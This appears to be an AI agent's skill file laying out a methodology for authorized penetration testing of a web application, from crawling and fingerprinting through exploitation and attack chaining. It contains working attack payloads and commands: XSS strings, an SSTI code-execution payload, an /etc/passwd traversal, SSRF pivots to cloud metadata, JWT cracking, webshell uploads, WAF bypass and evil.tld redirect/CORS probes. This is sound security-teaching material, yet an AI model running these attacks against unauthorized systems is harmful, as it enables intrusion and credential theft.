---
name: url
description: End-to-end methodology for assessing a single web application URL — crawl, map, fingerprint, and test every reachable surface.
---

# URL (Web Application)

A URL points at a live web application: a host, a scheme/port, and a path tree served over HTTP(S). The asset context is "crawl and test the web application at this URL," so the objective is to expand that single entry point into the full reachable surface — routes, parameters, APIs, auth flows, client-side JS, and supporting infrastructure — then validate concrete vulnerabilities against it. Treat the URL as a seed, not a boundary: everything you can reach same-origin (and the documented in-scope hosts it talks to) is fair game for authorized testing.

## Attack Surface

**Transport / edge**
- TLS config, redirect chains (`http→https`, apex↔www), HSTS, alternate ports, HTTP/2 and HTTP/1.1 differentials, CDN/WAF in front of origin.

**Routing & content**
- Static routes and SPA client routes, server-rendered templates, file extensions (`.php/.aspx/.jsp/.do`), virtual hosts on the same IP.

**Parameters & inputs**
- Query string, path segments, POST bodies (form/JSON/multipart), headers (`Host`, `X-Forwarded-*`, `Referer`, `User-Agent`), cookies, and file uploads.

**APIs**
- REST/JSON endpoints, GraphQL (`/graphql`), gRPC-web, WebSockets (`ws(s)://`), backend-for-frontend routes called by the SPA.

**Auth & session**
- Login/registration/reset flows, OAuth/OIDC/SAML redirects, session cookies, JWTs, API keys, CSRF tokens.

**Client-side**
- Inline and external JS (routes, secrets, feature flags), sourcemaps (`.map`), `postMessage` handlers, DOM sinks, third-party scripts.

**Exposed artifacts**
- `robots.txt`, `sitemap.xml`, `/.well-known/`, `.git/`, `.env`, backup files, Swagger/OpenAPI (`/openapi.json`, `/swagger.json`), admin panels, debug/actuator endpoints.

## Recon & Enumeration

Set up workspace and a base URL variable; keep all output structured for downstream steps.

```bash
mkdir -p recon crawl loot
U="https://target.tld"; H="target.tld"
```

Probe liveness, fingerprint tech, and identify the edge:

```bash
httpx -u "$U" -sc -title -server -td -location -fr -tls-grab -ip -cname -cdn -timeout 10 -j -o recon/httpx.jsonl
wafw00f "$U" | tee recon/wafw00f.txt          # WAF/CDN identity decides throttle + evasion
whatweb -a 3 "$U" | tee recon/whatweb.txt
```

Discover sibling hosts and ports (same-IP vhosts and origin behind CDN):

```bash
subfinder -d "$H" -all -silent -o recon/subs.txt
naabu -host "$H" -top-ports 1000 -rl 1000 -silent -o recon/ports.txt
nmap -sV -sC -Pn -p- --min-rate 2000 "$H" -oA recon/nmap   # full TCP, service/version
dnsx -l recon/subs.txt -a -resp -silent -o recon/dns.txt    # resolve, find origin IPs
```

Crawl breadth-first, including JS-discovered and XHR endpoints:

```bash
katana -u "$U" -d 4 -jc -jsl -kf all -xhr -c 10 -p 10 -rl 50 -timeout 10 \
  -ef png,jpg,jpeg,gif,svg,css,woff,woff2,ttf,eot,map -silent -j -o crawl/katana.jsonl
gospider -s "$U" -d 3 -c 10 -t 20 --other-source >> crawl/gospider.txt   # second pass
```

Extract URLs, parameters, and JS for analysis:

```bash
jq -r '.request.endpoint // .endpoint' crawl/katana.jsonl | sort -u > crawl/urls.txt
grep -oP '\?.*' crawl/urls.txt | grep -oP '[?&]\K[^=&]+' | sort -u > crawl/params.txt
# Pull JS, hunt for routes/secrets
mkdir -p loot/js && katana -u "$U" -d 3 -silent | grep -iE '\.js(\?|$)' | sort -u > crawl/js.txt
while read j; do curl -s "$j" -o "loot/js/$(echo "$j"|md5sum|cut -c1-12).js"; done < crawl/js.txt
trufflehog filesystem loot/js --only-verified --json > loot/js_secrets.json
gitleaks detect --no-git -s loot/js -r loot/js_gitleaks.json 2>/dev/null
grep -rhoP '"/[a-zA-Z0-9_./{}-]+"' loot/js | tr -d '"' | sort -u > crawl/js_routes.txt
```

Content discovery against the live tree (use crawl output to seed an extension/path list):

```bash
ffuf -u "$U/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -mc 200,204,301,302,307,401,403,405 -ac -rate 50 -t 25 -o recon/ffuf_dirs.json
ffuf -u "$U/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .bak,.old,.zip,.tar.gz,.json,.config,.env,.git -mc all -ac -fc 404 -o recon/ffuf_files.json
```

Targeted template scan once tech is known:

```bash
nuclei -u "$U" -as -s critical,high,medium -rl 50 -c 20 -timeout 10 -retries 1 -j -o recon/nuclei.jsonl
nuclei -u "$U" -tags exposure,misconfig,token,debug -severity high,critical -silent
```

Pull an OpenAPI/Swagger spec if present and import it directly:

```bash
for p in /openapi.json /swagger.json /v2/api-docs /api-docs /swagger/v1/swagger.json; do
  curl -fsS "$U$p" -o "recon/spec.json" && break; done
nuclei -u "$U" -im openapi -l recon/spec.json -silent   # spec-driven endpoint testing
```

If you find a `.git/` directory, dump and audit it:

```bash
git clone https://github.com/internetwache/GitTools 2>/dev/null
GitTools/Dumper/gitdumper.sh "$U/.git/" loot/git && trufflehog filesystem loot/git --only-verified
```

## Methodology

1. **Confirm and normalize the target.** Resolve the host, follow the redirect chain with `httpx -fr -location`, note the final origin, scheme, and any port forks. Record whether a WAF/CDN sits in front (`wafw00f`) — it shapes everything after.
2. **Fingerprint the stack.** Server, framework, language, CMS, and versions via `httpx -td` + `whatweb` + `nuclei -as`. Map to known CVEs but verify each against the live app rather than trusting version banners.
3. **Map the surface.** Crawl with Katana (JS + known-files + XHR), supplement with gospider, and content-discover with ffuf. Merge into one deduplicated `urls.txt`. Pull and parse every JS bundle for routes, API base paths, feature flags, and secrets.
4. **Catalog inputs.** For each route, enumerate query params, body fields (form/JSON/multipart), headers, and cookies. Build a parameter inventory; `arjun -u "$U/path" -oT recon/arjun.txt` finds hidden params the crawl missed.
5. **Establish auth context.** Register/log in if credentials are in scope; capture session cookies/JWT. Decode the JWT (`jwt_tool <token>`) and inspect cookie flags. Map authenticated vs unauthenticated route sets and role boundaries.
6. **Test injection sinks.** Reflected/stored values → XSS; DB-backed params → SQLi; template-rendered input → SSTI; URL/fetch params → SSRF; file paths → traversal/LFI; command-adjacent params → RCE. Drive systematically from the parameter inventory.
7. **Test access control.** Swap IDs (IDOR), strip/forge tokens, hit admin/actuator routes unauthenticated, and replay one role's requests as another (BFLA). Compare responses, not just status codes.
8. **Test logic and state.** Multi-step flows (checkout, reset, MFA), coupon/quota reuse, race conditions on stateful endpoints, mass assignment on JSON bodies.
9. **Test the edge & client.** Host-header injection, `X-Forwarded-*` trust, open redirect, CORS misconfig, request smuggling on HTTP/1.1, `postMessage`/DOM-XSS in the SPA.
10. **Validate, chain, report.** Build a minimal reproducible PoC for each finding, rule out false positives, and chain primitives into demonstrable impact.

## Key Weaknesses / Techniques

**Reflected / Stored / DOM XSS** — Inject a marker into every reflected param and search responses; for DOM sinks, trace tainted `location`/`postMessage` data to `innerHTML`/`eval`.
```
"><svg onload=alert(document.domain)>
'};alert(document.domain);//
```

**SQL injection** — Confirm with boolean/time diffs, then offload to sqlmap:
```bash
sqlmap -u "$U/item?id=1" --batch --level 3 --risk 2 --random-agent --technique=BEUST --dbs
sqlmap -r recon/request.txt --batch --dbs   # for POST/JSON/cookie params, save raw request first
```

**SSTI** — Probe `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`; a `49` reflection confirms. Escalate to RCE per engine (Jinja2 `{{ cycler.__init__.__globals__.os.popen('id').read() }}`).

**SSRF** — Any `url=`, `image=`, `webhook=`, `next=` style fetch param. Confirm blind egress with OAST:
```bash
interactsh-client -v        # yields a fresh *.oast.fun domain; embed it in the param
```
Then pivot to `169.254.169.254` / `metadata.google.internal` per cloud.

**Path traversal / LFI** — `?file=../../../../etc/passwd`, null-byte/encoding variants, PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`).

**IDOR / BFLA** — Increment/UUID-swap object identifiers across two authenticated sessions; access role-gated routes (`/admin`, `/api/internal/*`) with a low-priv token.

**Open redirect / Host-header** — `?next=//evil.tld`, `?url=https:evil.tld`; inject `Host: evil.tld` and `X-Forwarded-Host: evil.tld` and watch for it in password-reset links or cache keys.

**CORS misconfig** — Reflect `Origin: https://evil.tld` and check for `Access-Control-Allow-Origin: <reflected>` + `Allow-Credentials: true`:
```bash
curl -s -I "$U/api/me" -H "Origin: https://evil.tld" | grep -i access-control
```

**Auth/JWT** — `alg:none`, weak HMAC secret, `kid` injection, missing signature check:
```bash
jwt_tool "$TOKEN" -M at -t "$U/api/me" -rh "Authorization: Bearer "   # all attacks against endpoint
jwt_tool "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt              # crack HMAC secret
```

**File upload** — Bypass content-type/extension filters; upload polyglot/webshell where execution is reachable; confirm by requesting the stored path.

**Exposed config / secrets** — `.env`, `.git/config`, `actuator/env`, sourcemaps. Run `trufflehog`/`gitleaks` over dumped artifacts; verify keys against their provider before reporting.

## Validation

1. **Reproduce with a single clean request.** Capture the exact method, URL, headers, and body (`curl` or saved Burp request). A finding the agent can't replay deterministically is not a finding.
2. **Prove the security boundary was crossed**, not just anomalous output: XSS = JS executes in the victim origin; SQLi = controlled DB output or true/false oracle; SSRF = server-sourced OAST hit (source IP is the server, not the tester); IDOR = another user's data returned.
3. **Use harmless markers.** `alert(document.domain)` for XSS, `id`/`whoami` for RCE, a benign internal read for SSRF. Never destructive payloads.
4. **Diff against a baseline.** Compare the malicious response to the normal one (status, length, timing, content) to defeat generic error pages and reflection-without-execution.
5. **Confirm persistence/scope** for stored issues — does the payload fire for a different session/user?

## False Positives

- **Reflection ≠ XSS.** Value echoed but HTML-encoded or in a non-executing context is informational only; confirm execution in a real browser/DOM.
- **Version-banner CVEs.** `httpx -td`/nuclei version matches often flag back-ported or non-applicable CVEs; validate the actual vulnerable behavior.
- **403/401 on discovery** means the path exists but is gated — not automatically a vuln; verify it's reachable by an unintended principal.
- **WAF block pages** returning 200 with a challenge look like success; check body content, not just status.
- **Self-XSS / no cross-user impact** — payloads that only fire in the attacker's own session.
- **OAST hits from the tester's own browser/client** rather than the server — check the source IP before calling SSRF.
- **CORS to `*` without credentials** is usually low/no risk; impact needs reflected origin + `Allow-Credentials: true`.
- **Open redirect to same-origin** or to a strict allowlist is not exploitable.

## Chaining & Impact

- **Sourcemap/JS secret → API key → authenticated API → data exfil.** Leaked frontend secrets routinely unlock backend scope.
- **SSRF → cloud metadata → IAM credentials → control-plane access** (list buckets, read secrets, pivot).
- **IDOR + mass assignment → privilege escalation** (set `role:admin` on a profile-update endpoint).
- **Open redirect / host-header injection → OAuth token theft or poisoned password-reset link → account takeover.**
- **Reflected XSS + permissive CORS + no CSRF protection → full session/account compromise** via a single crafted link.
- **Exposed `.git`/`.env` → source + DB creds → direct backend access or further SQLi/RCE.**
- **SQLi → stacked queries / `xp_cmdshell` / `INTO OUTFILE` webshell → RCE → host foothold.**
- **File upload → webshell in an executable path → RCE.**

## Pro Tips

1. JS bundles are the richest map of a modern app — parse them first; routes, hidden params, internal API hosts, and dead-but-live endpoints all live there.
2. Always test the unauthenticated and authenticated surface separately, then a second low-priv role; the most valuable bugs sit at the boundary between them.
3. Save raw requests (Burp/`curl -v`) so sqlmap/jwt_tool/replay operate on the exact session, cookies, and CSRF tokens — re-deriving auth per tool wastes time and misses bugs.
4. Behind a CDN, find the origin IP (`dnsx` over historical subdomains, SAN certs, `Host`-header pivots) and test it directly to bypass the WAF.
5. Diff responses by length/timing/ETag, not status alone — many apps mask everything as 200 or a generic error.
6. Throttle to the WAF: once `wafw00f` names the edge, set `-rl`/`-rate` low and rotate payload encodings rather than getting the IP blocked mid-assessment.
7. Re-crawl after authenticating and after each role switch — the route graph changes and new sinks appear.
8. Chain to durable, demonstrable impact (one harmless internal read, one cross-user record, one short-lived token) and stop — don't pivot beyond the authorized scope.
